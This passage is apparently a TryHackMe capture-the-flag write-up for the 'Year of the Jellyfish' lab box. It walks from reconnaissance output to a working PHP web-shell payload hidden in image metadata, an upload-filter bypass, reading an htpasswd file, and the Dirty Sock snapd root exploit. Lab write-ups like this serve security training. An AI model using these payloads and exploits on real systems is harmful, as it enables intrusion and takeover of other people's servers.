OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sat Apr 24 12:30:55 2021 -- 1 IP address (1 host up) scanned in 52.25 seconds\n</code></pre> <p>I had to add https://robyns-petshop.thm/ to my hosts file to be able to access the website in the ports 80 and 443. Looks like <code>ssh</code> and <code>ftp</code> are open and also there is an under development page in the port 8000. This last page shows this message:</p> <pre><code>Under Construction\nThis site is under development. Please be patient.\n\nIf you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. &lt;MACHINE_IP&gt;:8000/ID_HERE)\n</code></pre> <p>So i guess we should look for that id somewhere. Before starting to throw <code>gobuster</code> or <code>nikto</code> to the pages i wanted to check the <code>ftp</code> service but looks like no anonymous login allowed. I tried <code>gobuster</code> in the main page (The other page always returned 200):</p> <pre><code>gobuster dir -k -u https://robyns-petshop.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            https://robyns-petshop.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2021/04/24 12:50:26 Starting gobuster\n===============================================================\n/content (Status: 301)\n/themes (Status: 301)\n/business (Status: 401)\n/assets (Status: 301)\n/plugins (Status: 301)\n/vendor (Status: 301)\n/config (Status: 301)\n/LICENSE (Status: 200)\n/server-status (Status: 403)\n===============================================================\n2021/04/24 12:53:49 Finished\n===============================================================\n</code></pre> <p>The <code>business</code> page ask for user and password... interesting. Looks like the page is using https://github.com/picocms/Pico/tree/v2.1.4, interesting but nothing usefull let's check <code>nikto</code>:</p> <pre><code>nikto -h https://robyns-petshop.thm\n\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          &lt;MACHINE_IP&gt;\n+ Target Hostname:    robyns-petshop.thm\n+ Target Port:        443\n---------------------------------------------------------------------------\n+ SSL Info:        Subject:  /C=GB/ST=South West/L=Bristol/O=Robyns Petshop/CN=robyns-petshop.thm/emailAddress=robyn@robyns-petshop.thm\n                   Ciphers:  TLS_AES_256_GCM_SHA384\n                   Issuer:   /C=GB/ST=South West/L=Bristol/O=Robyns Petshop/CN=robyns-petshop.thm/emailAddress=robyn@robyns-petshop.thm\n+ Start Time:         2021-04-24 13:01:51 (GMT-4)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.29 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ The site uses SSL and Expect-CT header is not present.\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ The Content-Encoding header is set to \"deflate\" this may mean that the server is vulnerable to the BREACH attack.\n+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.\n+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.\n+ OSVDB-3268: /config/: Directory indexing found.\n+ /config/: Configuration information may be available remotely.\n+ OSVDB-3233: /icons/README: Apache default file found.\n</code></pre>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#new-domains","title":"New domains","text":"<p>After crying a bit a found something (Why i dont check SSL certificates before?), <code>sslscan</code> report this for the main page:</p> <pre><code>sslscan https://robyns-petshop.thm/\n\nVersion: 2.0.8-static\nOpenSSL 1.1.1k-dev  xx XXX xxxx\n\nConnected to &lt;MACHINE_IP&gt;\n\nTesting SSL server robyns-petshop.thm on port 443 using SNI name robyns-petshop.thm\n\n  SSL/TLS Protocols:\nSSLv2     disabled\nSSLv3     disabled\nTLSv1.0   enabled\nTLSv1.1   enabled\nTLSv1.2   enabled\nTLSv1.3   enabled\n\n  TLS Fallback SCSV:\nServer supports TLS Fallback SCSV\n\n  TLS renegotiation:\nSecure session renegotiation supported\n\n  TLS Compression:\nCompression disabled\n\n  Heartbleed:\nTLSv1.3 not vulnerable to heartbleed\nTLSv1.2 not vulnerable to heartbleed\nTLSv1.1 not vulnerable to heartbleed\nTLSv1.0 not vulnerable to heartbleed\n\n  Supported Server Cipher(s):\nPreferred TLSv1.3  128 bits  TLS_AES_128_GCM_SHA256        Curve 25519 DHE 253\nAccepted  TLSv1.3  256 bits  TLS_AES_256_GCM_SHA384        Curve 25519 DHE 253\nAccepted  TLSv1.3  256 bits  TLS_CHACHA20_POLY1305_SHA256  Curve 25519 DHE 253\nPreferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve 25519 DHE 253\nAccepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 2048 bits\nAccepted  TLSv1.2  256 bits  ECDHE-RSA-CHACHA20-POLY1305   Curve 25519 DHE 253\nAccepted  TLSv1.2  256 bits  DHE-RSA-CHACHA20-POLY1305     DHE 2048 bits\nAccepted  TLSv1.2  256 bits  DHE-RSA-AES256-CCM8           DHE 2048 bits\nAccepted  TLSv1.2  256 bits  DHE-RSA-AES256-CCM            DHE 2048 bits\nAccepted  TLSv1.2  256 bits  ECDHE-ARIA256-GCM-SHA384      Curve 25519 DHE 253\nAccepted  TLSv1.2  256 bits  DHE-RSA-ARIA256-GCM-SHA384    DHE 2048 bits\nAccepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve 25519 DHE 253\nAccepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 2048 bits\nAccepted  TLSv1.2  128 bits  DHE-RSA-AES128-CCM8           DHE 2048 bits\nAccepted  TLSv1.2  128 bits  DHE-RSA-AES128-CCM            DHE 2048 bits\nAccepted  TLSv1.2  128 bits  ECDHE-ARIA128-GCM-SHA256      Curve 25519 DHE 253\nAccepted  TLSv1.2  128 bits  DHE-RSA-ARIA128-GCM-SHA256    DHE 2048 bits\nAccepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve 25519 DHE 253\nAccepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 2048 bits\nAccepted  TLSv1.2  256 bits  ECDHE-RSA-CAMELLIA256-SHA384  Curve 25519 DHE 253\nAccepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA256    DHE 2048 bits\nAccepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve 25519 DHE 253\nAccepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 2048 bits\nAccepted  TLSv1.2  128 bits  ECDHE-RSA-CAMELLIA128-SHA256  Curve 25519 DHE 253\nAccepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA256    DHE 2048 bits\nAccepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253\nAccepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits\nAccepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits\nAccepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253\nAccepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits\nAccepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits\nAccepted  TLSv1.2  256 bits  AES256-GCM-SHA384            \nAccepted  TLSv1.2  256 bits  AES256-CCM8                  \nAccepted  TLSv1.2  256 bits  AES256-CCM                   \nAccepted  TLSv1.2  256 bits  ARIA256-GCM-SHA384           \nAccepted  TLSv1.2  128 bits  AES128-GCM-SHA256            \nAccepted  TLSv1.2  128 bits  AES128-CCM8                  \nAccepted  TLSv1.2  128 bits  AES128-CCM                   \nAccepted  TLSv1.2  128 bits  ARIA128-GCM-SHA256           \nAccepted  TLSv1.2  256 bits  AES256-SHA256                \nAccepted  TLSv1.2  256 bits  CAMELLIA256-SHA256           \nAccepted  TLSv1.2  128 bits  AES128-SHA256                \nAccepted  TLSv1.2  128 bits  CAMELLIA128-SHA256           \nAccepted  TLSv1.2  256 bits  AES256-SHA                   \nAccepted  TLSv1.2  256 bits  CAMELLIA256-SHA              \nAccepted  TLSv1.2  128 bits  AES128-SHA                   \nAccepted  TLSv1.2  128 bits  CAMELLIA128-SHA              \nPreferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253\nAccepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits\nAccepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits\nAccepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253\nAccepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits\nAccepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits\nAccepted  TLSv1.1  256 bits  AES256-SHA                   \nAccepted  TLSv1.1  256 bits  CAMELLIA256-SHA              \nAccepted  TLSv1.1  128 bits  AES128-SHA                   \nAccepted  TLSv1.1  128 bits  CAMELLIA128-SHA              \nPreferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve 25519 DHE 253\nAccepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits\nAccepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits\nAccepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve 25519 DHE 253\nAccepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits\nAccepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits\nAccepted  TLSv1.0  256 bits  AES256-SHA                   \nAccepted  TLSv1.0  256 bits  CAMELLIA256-SHA              \nAccepted  TLSv1.0  128 bits  AES128-SHA                   \nAccepted  TLSv1.0  128 bits  CAMELLIA128-SHA              \n\n  Server Key Exchange Group(s):\nTLSv1.3  128 bits  secp256r1 (NIST P-256)\nTLSv1.3  192 bits  secp384r1 (NIST P-384)\nTLSv1.3  260 bits  secp521r1 (NIST P-521)\nTLSv1.3  128 bits  x25519\nTLSv1.3  224 bits  x448\nTLSv1.2  128 bits  secp256r1 (NIST P-256)\nTLSv1.2  192 bits  secp384r1 (NIST P-384)\nTLSv1.2  260 bits  secp521r1 (NIST P-521)\nTLSv1.2  128 bits  x25519\nTLSv1.2  224 bits  x448\n\n  SSL Certificate:\nSignature Algorithm: sha256WithRSAEncryption\nRSA Key Strength:    2048\n\nSubject:  robyns-petshop.thm\nAltnames: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm\nIssuer:   robyns-petshop.thm\n\nNot valid before: Apr 24 16:24:05 2021 GMT\nNot valid after:  Apr 24 16:24:05 2022 GMT\n</code></pre> <p>Some new domains to check: robyns-petshop.thm, monitorr.robyns-petshop.thm, beta.robyns-petshop.thm, dev.robyns-petshop.thm</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#betarobyns-petshopthm","title":"beta.robyns-petshop.thm","text":"<p>So this is the under development page we saw before. Using <code>gobuster</code> and <code>nikto</code> was useless because the page always return the code 200.</p> <p>Is asking for a ID i don't have sooo lets see the next page.</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#devrobyns-petshopthm","title":"dev.robyns-petshop.thm","text":"<p>Looks like is a another version of the main page (dev subdomain you know). <code>gobuster</code> returned:</p> <pre><code>gobuster dir -k -u https://dev.robyns-petshop.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            https://dev.robyns-petshop.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2021/04/24 13:56:09 Starting gobuster\n===============================================================\n/content (Status: 301)\n/themes (Status: 301)\n/business (Status: 401)\n/assets (Status: 301)\n/plugins (Status: 301)\n/vendor (Status: 301)\n/config (Status: 301)\n/LICENSE (Status: 200)\n/server-status (Status: 403)\n===============================================================\n2021/04/24 13:57:16 Finished\n===============================================================\n</code></pre> <p>No luck here, after trying also with <code>nikto</code> looks exactly as the main page. Also i tried to check for txt, php, json and yaml files with <code>gobuster</code> but no luck</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#monitorrrobyns-petshopthm","title":"monitorr.robyns-petshop.thm","text":"<p>Like the subdomain says is a monitor and looks like there is another page (Jellyfin) apart from the PetShop being monitored in the port 8096, i will look at it in a moment. The monitor that is being used is this one: https://github.com/Monitorr/Monitorr. Here is what <code>gobuster</code> returned:</p> <pre><code>===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            https://monitorr.robyns-petshop.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2021/04/24 14:04:21 Starting gobuster\n===============================================================\n/data (Status: 301)\n/assets (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2021/04/24 12:53:49 Finished\n===============================================================\n</code></pre> <p>In https://monitorr.robyns-petshop.thm/settings.php i noticed a text that said:</p> <p><pre><code>User database dir: /var/www/monitorr/data\nUser database file: /var/www/monitorr/datausers.db\n</code></pre> So... At this point i was kind of lucky because i though, if that <code>data</code> folder is the same reported by <code>gobuster</code> i guess i can just https://monitorr.robyns-petshop.thm/datausers.db right? And yep i got the users database yey. So now i guess i can try to get the hash cracked? <pre><code>1   admin   $2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa\n</code></pre></p> <p>Also checking https://monitorr.robyns-petshop.thm/assets/config/_installation/mkdbajax.php i saw that i can recreate the database and with https://monitorr.robyns-petshop.thm/assets/config/_installation/mkdirajax.php i can recreate the database and also the config files where i want them to be. I also learned that i can destroy the hole application if im not carefull with this lol.</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#httpmachine_ip8096","title":"http://MACHINE_IP:8096","text":"<p>So, here we have a Jellyfin application running. I tried the forgot my password option but only can be done if im in the same network, this is the petition that the form is sending by the way:</p> <pre><code>return ApiClient.ajax({\n    type: \"POST\",\n    url: ApiClient.getUrl(\"Users/ForgotPassword\"),\n    dataType: \"json\",\n    contentType: \"application/json\",\n    data: JSON.stringify({\n      EnteredUsername: e.querySelector(\"#txtName\").value\n    })\n  }).then(s), t.preventDefault(), !1\n}\n</code></pre> <p>I also noticed that the browser console in this page was printing a lot of information (Maybe debug mode?) and i found this <code>JSON credentials</code> thing in the console:</p> <pre><code>Stored JSON credentials: {\"Servers\":[{\"DateLastAccessed\":1619375869109,\"LastConnectionMode\":2,\"ManualAddress\":\"http://&lt;MACHINE_IP&gt;:8096\",\"manualAddressOnly\":true,\"Name\":\"petshop\",\"Id\":\"b6c698509b83439992b3e437c87f7fb5\",\"LocalAddress\":\"http://&lt;LOCAL_MACHINE_IP&gt;:8096\"}]}\n</code></pre> <p>I can see the local address of the machine (THM VPN) and some ids that don't work in the beta site, sad.</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#wait-a-minute-rce","title":"Wait a minute... RCE?","text":"<p>To be honest i spent hours trying to figure what to do next and trying to get something of the databases in  https://monitorr.robyns-petshop.thm. I went to sleep and when i woke up i checked the monitorr repo again. I saw an <code>upload.php</code> file in the <code>assets/php</code> folder... wait... Is that in the box? How could i have missed it? So yeah... i checked and in fact it was there, im stupid and i had tunnel vision with the databases and the data directories.</p> <p>So i looked through the <code>upload.php</code> code in the github repo and looks like the validation is done using <code>getimagesize</code> what is exploitable. I started up <code>postman</code> and started trying to <code>POST</code> an image (the parameter for the file to upload is called <code>fileToUpload</code> by the way) and what i got? \"You are an exploit.\" WAIT WHAT? No this wasn't a bad thing, was just a beach image wtf. But i saw the problem more or less quick, i needed to add to <code>postman</code> the cookie <code>isHuman</code> with the value 1.</p> <p>After configuring <code>postman</code> with the cookie i was able to update my image. I noticed that this file wasn't exactly the same as the one i saw in GitHub because it was checking the extensions too and also was checking for the substring <code>php</code> anywhere in the filename. After some digging i got an image called <code>example.jpg.phtml</code> through the filter. I tried to upload a <code>php</code> file named that way but no luck, probably is using the <code>getimagesize</code> function too but i think i can bypass that too.</p> <p>Using <code>exiftool</code> i added a payload as metadata to a normal image (Ty Ironhackers for the cheatsheet): <pre><code>exiftool -Comment=\"&lt;?php echo '&lt;form action=\\''.\\$PHP_SELF.'\\' method=\\'post\\'&gt;Command:&lt;input type=\\'text\\' name=\\'cmd\\'&gt;&lt;input type=\\'submit\\'&gt;&lt;/form&gt;'; if(\\$_POST){system(\\$_POST['cmd']);} __halt_compiler();\" example.jpg\n</code></pre> After that i renamed the image <code>example.jpg</code> to <code>example.jpg.phtml</code> and uploaded it. The file passed through the filer and when i checked the <code>assets/data/usrimg/</code> folder and clicked on it... there it was, my little form to send commands. RCE YEYYYY.</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#flag1txt","title":"flag1.txt","text":"<p>Before trying to get a shell i got the first flag using: <code>cat ../../../../flag1.txt</code></p> <pre><code>THM{**************************}\n</code></pre>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#reverse-shell-kind-of","title":"Reverse shell... kind of","text":"<p>After some time trying to get a reverse shell i couldn't get it working so a used this: https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php. Is a shell in the browser so at least is easier to explore the machine while a guess why i can't get a reverse shell on my site.</p> <p>I found that the <code>at</code> command could be a privesc vector but <code>www-data</code> can't use it</p> <p><code>cat /etc/apache2/htpasswd</code> contains the credentials for the business page in the dev and main page: <code>robyn:$apr1$tMFlj08b$5VCOhI2see0L0WRU8Mn.b.</code></p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#shell-from-http","title":"Shell from HTTP","text":"<p>So i got and idea and looks like im not the first with this problem. Looks like the shells are not comming back because some kind of firewall (more about this at the end) so i will need to use the webshell to spawn a full <code>pty</code>.</p> <ul> <li>First i will use the RCE i got to upload or generate a <code>cmd.php</code> page that will work with <code>GET</code> requests</li> <li>I will use the <code>tty-from-php-python.py</code> program. I got it from here and modified some parts. I know is a spanish site but im spanish, just go to the end of the article que check the code.</li> <li>Once the program is executed first run: <code>script /dev/null -c bash</code> to get a pty (Thanks god)</li> </ul>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#enumerate-enumerate","title":"Enumerate, enumerate...","text":"<p>I mainly used <code>linpeas.sh</code> for this along side some manual enumeration. Here i wrote some of the stuff that had promising versions to search for exploits:</p> <p><pre><code>Distributor ID: Ubuntu\nDescription:    Ubuntu 18.04.5 LTS\nRelease:        18.04\nCodename:       bionic\n\nSudo version 1.8.21p2\nLinux kernel 4.15.0-140-generic\nldd (Ubuntu GLIBC 2.27-3ubuntu1.4) 2.27\n\nsnap    2.32.5+18.04\nsnapd   2.32.5+18.04 &lt;---- https://www.exploit-db.com/exploits/46362\n</code></pre> The snapd version ended up being the key, it was vulnerable to an exploit called Dirty Sock. Using my php <code>pty</code> thing i executed the exploit and...</p> <pre><code>      ___  _ ____ ___ _   _     ____ ____ ____ _  _ \n      |  \\ | |__/  |   \\_/      [__  |  | |    |_/  \n      |__/ | |  \\  |    |   ___ ___] |__| |___ | \\_ \n                       (version 2)\n\n//=========[]==========================================\\\\\n|| R&amp;D     || initstring (@init_string)                ||\n|| Source  || https://github.com/initstring/dirty_sock ||\n|| Details || https://initblog.com/2019/dirty-sock     ||\n\\\\=========[]==========================================//\n\n\n[+] Slipped dirty sock on random socket file: /tmp/lznnxqwpco;uid=0;\n[+] Binding to socket file...\n[+] Connecting to snapd API...\n[+] Deleting trojan snap (and sleeping 5 seconds)...\n[+] Deleting trojan snap (and sleeping 5 seconds)...\n[+] Installing the trojan snap (and sleeping 8 seconds)...\n[+] Installing the trojan snap (and sleeping 8 seconds)...\n[+] Deleting trojan snap (and sleeping 5 seconds)...\n[+] Deleting trojan snap (and sleeping 5 seconds)...\n\n\n\n********************\nSuccess! You can now `su` to the following account and use sudo:\n   username: dirty_sock\n   password: dirty_sock\n********************\n</code></pre> <p>It worked! (Actually, looks like sometimes the exploit reports an error, don't worry, if the target is vulnerable the account is created anyway) I just used <code>su dirty_sock</code> with <code>dirty_sock</code> as the password and then <code>sudo su</code>: <pre><code>root@petshop:/var/www/monitorr/assets/data/usrimg#\n</code></pre> Omg that was a long one, the flag was in the <code>root</code> directory as usual:</p> <pre><code>root@petshop:/var/www/monitorr/assets/data/usrimg# cd /root\nroot@petshop:~# ls\nroot.txt  snap\nroot@petshop:~# cat root.txt\nTHM{**************************}\n</code></pre>"},{"location":"TryHackMe%21/YearOfTheJellyfish/#last-thing","title":"Last thing","text":"<p>After getting root access i tried some things and i got a proper reverse shell, a bit late but hey at least i got it. The problem was an egress firewall, i just had to put netcat to listen in the 443 port (Remember to use your THM VPN IP to connect from the target machine to yours).</p> <p>I have to say that im pretty stuppid because in part i knew i could use <code>curl</code> and <code>wget</code> to get for example <code>google.com</code> but i think i just got obsessed with the box and wasn't really thinking clearly. At least i got a new tool, not perfect but works. Also i should use <code>searchexploit</code> more, can be faster than Google.</p>"}]}